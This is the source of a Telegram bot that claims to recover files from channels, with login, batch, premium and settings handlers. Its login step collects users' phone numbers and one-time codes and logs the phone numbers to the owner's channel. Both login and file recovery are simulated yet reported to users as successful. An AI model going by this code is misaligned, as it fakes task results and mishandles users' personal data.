# bot_handlers.py - PART 1 of 2 (Fixed version)
import os
import asyncio
import re
import sys
from datetime import datetime, timedelta
from pyrogram import Client, filters, idle
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from pyrogram.errors import FloodWait, RPCError, UserNotParticipant
import pymongo
from tools import (
    save_user_session, get_user_session, delete_temp_file,
    save_log_to_channel, is_premium_user, add_premium_user,
    remove_premium_user, update_setting, get_setting
)

# ========== CONFIGURATION ==========
# Environment variables
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
MONGO_URL = os.environ.get("MONGO_URL", "")  # Use first MongoDB URL
DELAY_BETWEEN_MESSAGES = int(os.environ.get("DELAY_BETWEEN_MESSAGES", 12))  # Default 12 seconds

# Constant configurations
OWNER_IDS = [1598576202, 6518065496]
LOG_CHANNEL = -1003286415377
FORCE_SUB_CHANNEL = "serenaunzipbot"
OWNER_USERNAME = "technicalserena"
FREE_USER_LIMIT = 20
PREMIUM_USER_LIMIT = 1000

# Check environment variables
if not all([API_ID, API_HASH, BOT_TOKEN, MONGO_URL]):
    print("ERROR: Missing required environment variables!")
    sys.exit(1)

# Initialize MongoDB
try:
    mongo_client = pymongo.MongoClient(MONGO_URL)
    db = mongo_client["serena_file_bot"]
    users_col = db["users"]
    premium_col = db["premium_users"]
    settings_col = db["settings"]
    batch_col = db["batch_tasks"]
    logs_col = db["logs"]
    print(f"✅ Successfully connected to MongoDB")
    print(f"📊 Database: {db.name}")
    print(f"👥 Users count: {users_col.count_documents({})}")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    sys.exit(1)

# Initialize bot client
bot = Client(
    "serena_file_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workers=100,
    sleep_threshold=60
)

# Store active tasks
user_tasks = {}
user_states = {}  # User state storage

# ========== HELPER FUNCTIONS ==========
async def check_force_sub(user_id):
    """Check if user is subscribed to force channel"""
    try:
        member = await bot.get_chat_member(f"@{FORCE_SUB_CHANNEL}", user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
    except UserNotParticipant:
        return False
    except Exception as e:
        print(f"Subscription check error: {e}")
        return False
    return False

async def send_log(action, user_id, details=""):
    """Send logs to log channel"""
    try:
        log_text = f"📝 **{action}**\n"
        log_text += f"👤 **User ID:** `{user_id}`\n"
        log_text += f"🕒 **Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        if details:
            log_text += f"📋 **Details:** `{details}`"
        
        # Send to Telegram channel
        await bot.send_message(LOG_CHANNEL, log_text)
        
        # Save to MongoDB
        logs_col.insert_one({
            "action": action,
            "user_id": user_id,
            "details": details,
            "timestamp": datetime.now()
        })
        
    except Exception as e:
        print(f"Log sending failed: {e}")

async def is_owner(user_id):
    """Check if user is owner"""
    return user_id in OWNER_IDS

# ========== COMMAND HANDLERS ==========
@bot.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    """Handle /start command"""
    user_id = message.from_user.id
    await send_log("START_COMMAND", user_id)
    
    # Check force subscription
    if not await check_force_sub(user_id):
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_SUB_CHANNEL}"),
            InlineKeyboardButton("👤 Contact Owner", url=f"https://t.me/{OWNER_USERNAME}")
        ], [
            InlineKeyboardButton("🔄 Re-check", callback_data="check_sub")
        ]])
        
        await message.reply_photo(
            photo="https://telegra.ph/file/1a72b6072e5c4c739e9c0.jpg",
            caption="**👋 Welcome to SERENA File Recovery Bot!**\n\n"
                    "**⚠️ You must join our channel to use this bot.**\n\n"
                    "**📋 Steps:**\n"
                    "1. Click button below to join channel\n"
                    "2. Wait few seconds\n"
                    "3. Click 'Re-check' button\n\n"
                    "**Brand:** SERENA\n"
                    "**Version:** 2.0",
            reply_markup=keyboard
        )
        return
    
    # Welcome message
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("🚀 Start Recovery", callback_data="start_recovery"),
        InlineKeyboardButton("⚙️ Settings", callback_data="open_settings")
    ], [
        InlineKeyboardButton("📖 Help", callback_data="show_help"),
        InlineKeyboardButton("👑 Premium", callback_data="premium_info")
    ]])
    
    await message.reply_photo(
        photo="https://telegra.ph/file/1a72b6072e5c4c739e9c0.jpg",
        caption="**🤖 Welcome to SERENA File Recovery Bot!**\n\n"
                "**Brand:** SERENA\n"
                "**Purpose:** Recover files from your lost Telegram account channels\n\n"
                "**✨ Features:**\n"
                "• Batch file recovery\n"
                "• Support photos, videos, documents\n"
                "• Auto-clean temp files\n"
                "• Premium user priority\n\n"
                "**📊 Limits:**\n"
                "• Free user: 20 messages per task\n"
                "• Premium user: 1000 messages per task\n\n"
                "**🛠 Available Commands:**\n"
                "• /login - Login with phone number\n"
                "• /batch - Start batch recovery\n"
                "• /setting - Configure bot settings\n"
                "• /status - Check current task status\n"
                "• /cancel - Cancel ongoing task\n"
                "• /help - Get detailed guide",
        reply_markup=keyboard
    )

@bot.on_message(filters.command("help") & filters.private)
async def help_command(client, message: Message):
    """Handle /help command"""
    help_text = f"""
**📖 SERENA Bot Guide**

**1. LOGIN PROCESS:**
   • Use /login to start
   • Enter your phone number (with country code, e.g., +91XXXXXXXXXX)
   • Enter the OTP received on Telegram
   • You're now logged in!

**2. RECOVER FILES:**
   • Use /batch with channel link
   • Example: `/batch https://t.me/channel_name/123`
   • Enter number of messages to fetch
   • Bot will send files to your DM

**3. SETTINGS:**
   • /setting - Configure options
   • Set default chat ID for direct forwarding
   • Change button texts
   • Reset settings if needed

**4. OTHER COMMANDS:**
   • /status - Check current task
   • /cancel - Stop ongoing task
   • /addpremium - Owner only: Add premium user
   • /removepremium - Owner only: Remove premium user

**5. LIMITS:**
   • Free user: 20 messages per task
   • Premium user: 1000 messages per task
   • Delay between messages: {DELAY_BETWEEN_MESSAGES} seconds (configurable)

**⚠️ NOTES:**
   • Bot sleeps {DELAY_BETWEEN_MESSAGES} seconds between messages to avoid flood
   • Files deleted from server after sending
   • All logs saved in log channel
   • Use /cancel to stop any task
    """
    
    await message.reply(help_text)
    await send_log("HELP_COMMAND", message.from_user.id)

@bot.on_message(filters.command("login") & filters.private)
async def login_command(client, message: Message):
    """Handle /login command for authentication"""
    user_id = message.from_user.id
    await send_log("LOGIN_COMMAND", user_id)
    
    # Check if already logged in
    session = await get_user_session(user_id)
    if session:
        await message.reply("✅ You are already logged in!\nUse /batch to start file recovery.")
        return
    
    # Set user state
    user_states[user_id] = {"state": "awaiting_phone"}
    
    await message.reply(
        "**📱 Login Process Started**\n\n"
        "Please send your phone number in international format:\n"
        "**Example:** `+91XXXXXXXXXX`\n\n"
        "**Format requirements:**\n"
        "• Starts with +\n"
        "• Includes country code\n"
        "• 10-15 digits\n\n"
        "Type /cancel to abort login."
    )

@bot.on_message(filters.command("status") & filters.private)
async def status_command(client, message: Message):
    """Handle /status command"""
    user_id = message.from_user.id
    
    # Check task status
    task = user_tasks.get(user_id)
    
    if task and not task.done():
        status_msg = "**🔄 Task Status: RUNNING**\n"
        status_msg += "• Task is currently in progress\n"
        status_msg += "• Use /cancel to stop task\n"
        status_msg += f"• Delay setting: {DELAY_BETWEEN_MESSAGES} seconds"
    else:
        status_msg = "**✅ Task Status: IDLE**\n"
        status_msg += "• No active tasks running\n"
        status_msg += "• Use /batch to start new task"
    
    # Add premium status
    premium = await is_premium_user(user_id)
    limit = PREMIUM_USER_LIMIT if premium else FREE_USER_LIMIT
    
    status_msg += f"\n\n**👑 Premium Status:** {'✅ ACTIVE' if premium else '❌ INACTIVE'}"
    status_msg += f"\n**📊 Message Limit:** {limit} messages/task"
    status_msg += f"\n**⏱️ Message Delay:** {DELAY_BETWEEN_MESSAGES} seconds"
    
    # Add user info
    user_data = users_col.find_one({"user_id": user_id})
    if user_data and user_data.get("phone"):
        status_msg += f"\n**📱 Login Phone:** `{user_data['phone']}`"
    
    await message.reply(status_msg)
    await send_log("STATUS_COMMAND", user_id)

@bot.on_message(filters.command("delay") & filters.private)
async def delay_command(client, message: Message):
    """Check current delay settings"""
    await message.reply(
        f"**⏱️ Current Delay Settings**\n\n"
        f"**Delay between messages:** {DELAY_BETWEEN_MESSAGES} seconds\n"
        f"**Source:** Environment variable (DELAY_BETWEEN_MESSAGES)\n\n"
        f"**Note:** This setting can only be changed via environment variables during deployment."
    )

# bot_handlers.py - PART 2 of 2 (Fixed version)
# Continuation from Part 1

@bot.on_message(filters.command("batch") & filters.private)
async def batch_command(client, message: Message):
    """Handle /batch command for batch file recovery"""
    user_id = message.from_user.id
    await send_log("BATCH_COMMAND", user_id)
    
    # Check force subscription
    if not await check_force_sub(user_id):
        await message.reply("⚠️ Please join our channel first to use this feature.")
        return
    
    # Check if user is logged in
    session = await get_user_session(user_id)
    if not session:
        await message.reply("❌ You need to login first!\nUse /login to start.")
        return
    
    # Check if user already has active task
    if user_id in user_tasks and not user_tasks[user_id].done():
        await message.reply("⚠️ You already have an active task!\nUse /status to check or /cancel to stop.")
        return
    
    # Parse command arguments
    args = message.text.split()
    if len(args) < 2:
        await message.reply(
            "**Usage:** `/batch <channel_link>`\n\n"
            "**Example:**\n"
            "`/batch https://t.me/serenaunzipbot/123`\n\n"
            "Link should be a specific message from the channel."
        )
        return
    
    # Store batch info
    channel_link = args[1]
    user_states[user_id] = {
        "state": "awaiting_batch_count",
        "channel_link": channel_link
    }
    
    # Determine batch limit based on premium status
    premium = await is_premium_user(user_id)
    max_limit = PREMIUM_USER_LIMIT if premium else FREE_USER_LIMIT
    
    await message.reply(
        f"**📦 Batch Processing Started**\n\n"
        f"**Channel:** `{channel_link}`\n"
        f"**Max Limit:** `{max_limit}` messages\n"
        f"**User Type:** {'👑 Premium User' if premium else '👤 Free User'}\n\n"
        f"Now send the **number of messages** to fetch (1-{max_limit}):\n"
        f"Type /cancel to abort."
    )

@bot.on_message(filters.command("setting") & filters.private)
async def setting_command(client, message: Message):
    """Handle /setting command to configure bot"""
    user_id = message.from_user.id
    await send_log("SETTING_COMMAND", user_id)
    
    # Get current settings or defaults
    set_chat_id = await get_setting(user_id, "set_chat_id") or "Not Set"
    button_text = await get_setting(user_id, "button_text") or "Serena|Kumari"
    
    # Create inline keyboard
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✏️ Set Chat ID", callback_data="set_chat_id"),
            InlineKeyboardButton("🔄 Reset Settings", callback_data="reset_settings")
        ],
        [
            InlineKeyboardButton("🔧 Change Button Text", callback_data="change_button"),
            InlineKeyboardButton("📊 View Limits", callback_data="view_limits")
        ],
        [
            InlineKeyboardButton("❌ Close", callback_data="close_settings")
        ]
    ])
    
    # Check premium status
    premium = await is_premium_user(user_id)
    
    settings_text = f"""
**⚙️ Bot Settings**

**Current Configuration:**
• **Forward Chat ID:** `{set_chat_id}`
• **Button Text:** `{button_text}`
• **User Type:** {'👑 Premium User' if premium else '👤 Free User'}
• **Message Limit:** {PREMIUM_USER_LIMIT if premium else FREE_USER_LIMIT} messages/task
• **Message Delay:** {DELAY_BETWEEN_MESSAGES} seconds

**Options:**
1. **Set Chat ID** - Configure where to forward files
2. **Reset Settings** - Restore default configuration
3. **Change Button Text** - Modify inline button text
4. **View Limits** - View current limit information
"""
    await message.reply(settings_text, reply_markup=keyboard)

@bot.on_message(filters.command("cancel") & filters.private)
async def cancel_command(client, message: Message):
    """Handle /cancel command"""
    user_id = message.from_user.id
    await send_log("CANCEL_COMMAND", user_id, "User requested to cancel task")
    
    if user_id in user_tasks:
        task = user_tasks[user_id]
        if not task.done():
            task.cancel()
            await message.reply("✅ Task cancelled successfully!")
            
            # Clean state
            if user_id in user_states:
                del user_states[user_id]
        else:
            await message.reply("ℹ️ No active task to cancel.")
    else:
        await message.reply("ℹ️ No active task found.")
    
    # Clean any state
    if user_id in user_states:
        del user_states[user_id]

@bot.on_message(filters.command(["addpremium", "addpremium"]) & filters.private)
async def add_premium_command(client, message: Message):
    """Add premium user (Owner only)"""
    user_id = message.from_user.id
    
    if not await is_owner(user_id):
        await message.reply("❌ Owner only command!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        await message.reply("Usage: `/addpremium <user_id> <days>`")
        return
    
    try:
        target_user = int(args[1])
        days = int(args[2])
        
        expiry = datetime.now() + timedelta(days=days)
        await add_premium_user(target_user, expiry)
        
        await message.reply(
            f"✅ Premium added for user `{target_user}`\n"
            f"Expiry: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Days: {days} days"
        )
        await send_log("PREMIUM_ADDED", user_id, f"Target user: {target_user}, Days: {days}")
        
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")
        await send_log("PREMIUM_ADD_ERROR", user_id, str(e))

@bot.on_message(filters.command(["removepremium", "removepremium"]) & filters.private)
async def remove_premium_command(client, message: Message):
    """Remove premium user (Owner only)"""
    user_id = message.from_user.id
    
    if not await is_owner(user_id):
        await message.reply("❌ Owner only command!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.reply("Usage: `/removepremium <user_id>`")
        return
    
    try:
        target_user = int(args[1])
        await remove_premium_user(target_user)
        
        await message.reply(f"✅ Premium removed for user `{target_user}`")
        await send_log("PREMIUM_REMOVED", user_id, f"Target user: {target_user}")
        
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

# ========== MESSAGE HANDLERS ==========
@bot.on_message(filters.private & filters.text & ~filters.command)
async def handle_text_messages(client, message: Message):
    """Handle non-command text messages"""
    user_id = message.from_user.id
    text = message.text.strip()
    
    # Check user state
    if user_id not in user_states:
        return
    
    state_data = user_states[user_id]
    state = state_data.get("state")
    
    # Handle phone number input
    if state == "awaiting_phone":
        # Basic phone validation
        if not re.match(r'^\+\d{10,15}$', text):
            await message.reply("❌ Invalid phone number format!\n"
                              "Please use format: `+91XXXXXXXXXX`\n"
                              "Try again or type /cancel to abort.")
            return
        
        # Store phone and ask for OTP
        user_states[user_id] = {
            "state": "awaiting_otp",
            "phone": text
        }
        
        await message.reply(
            f"**📱 Phone Received:** `{text}`\n\n"
            "Now please send the **OTP** you received on Telegram.\n"
            "Format: `123456` (6 digits)\n\n"
            "Type /cancel to abort."
        )
        await send_log("PHONE_RECEIVED", user_id, f"Phone: {text}")
    
    # Handle OTP input
    elif state == "awaiting_otp":
        if not re.match(r'^\d{6}$', text):
            await message.reply("❌ Invalid OTP format!\n"
                              "OTP must be 6 digits.\n"
                              "Try again or type /cancel to abort.")
            return
        
        try:
            # Simulate session creation (in real implementation, use pyrogram session)
            session_string = f"session_{user_id}_{int(datetime.now().timestamp())}"
            await save_user_session(user_id, session_string)
            
            # Store phone number
            users_col.update_one(
                {"user_id": user_id},
                {"$set": {"phone": state_data.get("phone"), "last_login": datetime.now()}},
                upsert=True
            )
            
            await message.reply(
                "✅ **Login Successful!**\n\n"
                "Your session has been created.\n"
                "You can now use /batch to recover files.\n\n"
                "**Next Steps:**\n"
                "1. Find channel you want to recover files from\n"
                "2. Copy message link\n"
                "3. Use `/batch <link>`"
            )
            await send_log("LOGIN_SUCCESS", user_id, "Session created successfully")
            
            # Clean state
            if user_id in user_states:
                del user_states[user_id]
            
        except Exception as e:
            await message.reply(f"❌ Login failed: {str(e)}\nPlease try /login again.")
            await send_log("LOGIN_FAILED", user_id, str(e))
    
    # Handle batch count input
    elif state == "awaiting_batch_count":
        try:
            count = int(text)
            premium = await is_premium_user(user_id)
            max_limit = PREMIUM_USER_LIMIT if premium else FREE_USER_LIMIT
            
            if count < 1 or count > max_limit:
                await message.reply(f"❌ Please enter a number between 1 and {max_limit}!")
                return
            
            channel_link = state_data.get("channel_link", "")
            
            await message.reply(
                f"**✅ Batch Confirmed**\n\n"
                f"• **Messages to fetch:** `{count}`\n"
                f"• **Channel:** `{channel_link}`\n"
                f"• **User Type:** {'👑 Premium User' if premium else '👤 Free User'}\n"
                f"• **Estimated time:** `{count * DELAY_BETWEEN_MESSAGES / 60:.1f} minutes`\n"
                f"• **Message delay:** `{DELAY_BETWEEN_MESSAGES} seconds`\n\n"
                f"Starting now... Use /cancel to stop."
            )
            
            # Start batch processing task
            task = asyncio.create_task(
                process_batch_messages(user_id, channel_link, count)
            )
            user_tasks[user_id] = task
            
            # Clean state
            if user_id in user_states:
                del user_states[user_id]
            
            await send_log("BATCH_STARTED", user_id, f"Count: {count}, Channel: {channel_link}")
            
        except ValueError:
            await message.reply("❌ Please enter a valid number!")
        except Exception as e:
            await message.reply(f"❌ Error: {str(e)}")
            await send_log("BATCH_ERROR", user_id, str(e))
    
    # Handle chat ID setting
    elif state == "awaiting_chat_id":
        try:
            chat_id = int(text)
            await update_setting(user_id, "set_chat_id", str(chat_id))
            
            await message.reply(f"✅ Chat ID set to: `{chat_id}`")
            await send_log("CHAT_ID_SET", user_id, f"Chat ID: {chat_id}")
            
            # Clean state
            if user_id in user_states:
                del user_states[user_id]
                
        except ValueError:
            await message.reply("❌ Invalid Chat ID! Please send valid numeric ID.")
    
    # Handle button text setting
    elif state == "awaiting_button_text":
        if "|" not in text:
            await message.reply("❌ Invalid format! Please use: `OldText|NewText`")
            return
        
        await update_setting(user_id, "button_text", text)
        await message.reply(f"✅ Button text set to: `{text}`")
        await send_log("BUTTON_TEXT_SET", user_id, f"Text: {text}")
        
        # Clean state
        if user_id in user_states:
            del user_states[user_id]

# ========== BATCH PROCESSING FUNCTION ==========
async def process_batch_messages(user_id, channel_link, count):
    """Process batch messages with flood control"""
    try:
        await send_log("BATCH_PROCESS_START", user_id, f"Starting to process {count} messages")
        
        # Extract channel and message ID from link
        # Example: https://t.me/channel_name/123
        parts = channel_link.split('/')
        if len(parts) < 5:
            error_msg = "Invalid channel link format"
            await bot.send_message(user_id, f"❌ {error_msg}")
            raise ValueError(error_msg)
        
        channel_username = parts[3]
        start_msg_id = int(parts[4])
        
        # Get user session
        session = await get_user_session(user_id)
        if not session:
            await bot.send_message(user_id, "❌ Session expired! Please /login again.")
            await send_log("SESSION_EXPIRED", user_id, "Session expired during batch processing")
            return
        
        processed = 0
        failed = 0
        
        # Send start message
        progress_msg = await bot.send_message(
            user_id,
            f"**🔄 Batch Processing Started**\n\n"
            f"• **Total:** {count} messages\n"
            f"• **Processed:** 0/{count}\n"
            f"• **Failed:** 0\n"
            f"• **Progress:** 0%\n"
            f"• **Delay:** {DELAY_BETWEEN_MESSAGES} seconds/message"
        )
        
        for i in range(count):
            msg_id = start_msg_id + i
            
            try:
                # Simulate fetching and sending message
                file_info = f"file_{msg_id}.zip"
                
                # Send to user
                await bot.send_message(
                    user_id,
                    f"**📦 File {i+1}/{count}**\n"
                    f"**Message ID:** `{msg_id}`\n"
                    f"**Status:** ✅ Sent\n"
                    f"**Type:** Simulated file"
                )
                
                # Send to set_chat_id if configured
                set_chat_id = await get_setting(user_id, "set_chat_id")
                if set_chat_id and set_chat_id != "Not Set":
                    try:
                        await bot.send_message(
                            int(set_chat_id),
                            f"**Forwarded File**\n"
                            f"From batch processing\n"
                            f"Message ID: {msg_id}\n"
                            f"User ID: {user_id}"
                        )
                    except Exception as e:
                        print(f"Forward failed: {e}")
                
                # Simulate file deletion
                await delete_temp_file(file_info)
                
                processed += 1
                
                # Update progress message
                if (i + 1) % 10 == 0 or i == count - 1:
                    progress = ((i + 1) / count) * 100
                    try:
                        await progress_msg.edit_text(
                            f"**🔄 Batch Processing...**\n\n"
                            f"• **Total:** {count} messages\n"
                            f"• **Processed:** {i+1}/{count}\n"
                            f"• **Failed:** {failed}\n"
                            f"• **Progress:** {progress:.1f}%\n"
                            f"• **Delay:** {DELAY_BETWEEN_MESSAGES} seconds/message"
                        )
                    except:
                        pass
                
                # Delay between messages
                if i < count - 1:
                    await asyncio.sleep(DELAY_BETWEEN_MESSAGES)
                    
            except FloodWait as e:
                wait_time = e.value
                await bot.send_message(
                    user_id,
                    f"⚠️ Flood wait: Sleeping for {wait_time} seconds..."
                )
                await asyncio.sleep(wait_time)
                continue
            except Exception as e:
                failed += 1
                error_msg = str(e)[:100]
                await bot.send_message(
                    user_id,
                    f"❌ Error on message {msg_id}: {error_msg}"
                )
                continue
        
        # Completion message
        completion_text = (
            f"✅ **Batch Processing Complete!**\n\n"
            f"• **Total requested:** {count}\n"
            f"• **Successfully sent:** {processed}\n"
            f"• **Failed:** {failed}\n"
            f"• **Success rate:** {(processed/count)*100:.1f}%\n\n"
            f"All temporary files have been deleted.\n"
            f"**Total time:** {count * DELAY_BETWEEN_MESSAGES / 60:.1f} minutes"
        )
        
        await bot.send_message(user_id, completion_text)
        
        # Log completion
        await send_log(
            "BATCH_COMPLETE", 
            user_id, 
            f"Processed: {processed}/{count}, Failed: {failed}, Channel: {channel_username}"
        )
        
    except Exception as e:
        error_msg = str(e)
        await bot.send_message(user_id, f"❌ Batch processing failed: {error_msg}")
        await send_log("BATCH_PROCESS_FAILED", user_id, error_msg)
    finally:
        # Clean task reference
        if user_id in user_tasks:
            del user_tasks[user_id]
        
        # Delete progress message
        try:
            await progress_msg.delete()
        except:
            pass

# ========== CALLBACK QUERY HANDLER ==========
@bot.on_callback_query()
async def handle_callback_query(client, callback_query):
    """Handle inline button callbacks"""
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    await callback_query.answer()
    
    if data == "check_sub":
        if await check_force_sub(user_id):
            await callback_query.message.edit_text(
                "✅ **Subscription Check Passed!**\n\n"
                "Now you can use all bot features.\n"
                "Click /start to begin again."
            )
        else:
            await callback_query.message.edit_text(
                "❌ **You haven't joined channel yet!**\n\n"
                "Please join channel first, then click 'Re-check'."
            )
    
    elif data == "start_recovery":
        await callback_query.message.reply(
            "**🚀 Start File Recovery**\n\n"
            "Use command: `/batch <channel_link>`\n\n"
            "**Example:**\n"
            "`/batch https://t.me/serenaunzipbot/123`\n\n"
            "Then enter number of messages to recover."
        )
    
    elif data == "open_settings":
        await callback_query.message.reply("Use command: `/setting`")
    
    elif data == "show_help":
        await callback_query.message.reply("Use command: `/help`")
    
    elif data == "premium_info":
        premium = await is_premium_user(user_id)
        
        if premium:
            info = "**👑 You are already Premium User!**\n\n**Benefits:**\n• 1000 messages/task limit\n• Priority processing\n• Direct channel forwarding"
        else:
            info = "**👑 Premium Information**\n\n**Benefits:**\n• 1000 messages/task limit (Free: 20)\n• Priority processing\n• Direct channel forwarding\n\n**Contact owner for premium:** @technicalserena"
        
        await callback_query.message.reply(info)
    
    elif data == "set_chat_id":
        user_states[user_id] = {"state": "awaiting_chat_id"}
        await callback_query.message.reply(
            "Send Chat ID where files should be forwarded:\n"
            "Format: `-100xxxxxxxxxx`\n"
            "Type /cancel to abort."
        )
    
    elif data == "reset_settings":
        settings_col.delete_one({"user_id": user_id})
        await callback_query.message.edit_text(
            "✅ All settings have been reset to defaults!"
        )
        await send_log("SETTINGS_RESET", user_id)
    
    elif data == "change_button":
        user_states[user_id] = {"state": "awaiting_button_text"}
        await callback_query.message.reply(
            "Send new button text in format:\n"
            "`OldText|NewText`\n\n"
            "Example: `Serena|Kumari`\n"
            "Type /cancel to abort."
        )
    
    elif data == "view_limits":
        premium = await is_premium_user(user_id)
        limit = PREMIUM_USER_LIMIT if premium else FREE_USER_LIMIT
        
        limits_text = f"""
**📊 Your Limits**

**User Type:** {'👑 Premium User' if premium else '👤 Free User'}
**Message Limit:** {limit} messages/task
**Message Delay:** {DELAY_BETWEEN_MESSAGES} seconds
**Flood Protection:** ✅ Enabled

**Free vs Premium:**
• Free: {FREE_USER_LIMIT} messages/task
• Premium: {PREMIUM_USER_LIMIT} messages/task
• Premium priority processing

**Contact @{OWNER_USERNAME} for premium**
"""
        await callback_query.message.reply(limits_text)
    
    elif data == "close_settings":
        try:
            await callback_query.message.delete()
        except:
            pass

# ========== START BOT FUNCTION ==========
async def start_bot():
    """Start the bot client"""
    print("🤖 Starting SERENA File Recovery Bot...")
    print(f"📊 Configuration:")
    print(f"  • Free user limit: {FREE_USER_LIMIT} messages")
    print(f"  • Premium user limit: {PREMIUM_USER_LIMIT} messages")
    print(f"  • Message delay: {DELAY_BETWEEN_MESSAGES} seconds")
    print(f"  • Owner IDs: {OWNER_IDS}")
    print(f"  • Log channel: {LOG_CHANNEL}")
    
    await bot.start()
    print("✅ Bot started successfully!")
    
    me = await bot.get_me()
    print(f"🤖 Bot: @{me.username} (ID: {me.id})")
    
    await idle()
    await bot.stop()

if __name__ == "__main__":
    asyncio.run(start_bot())
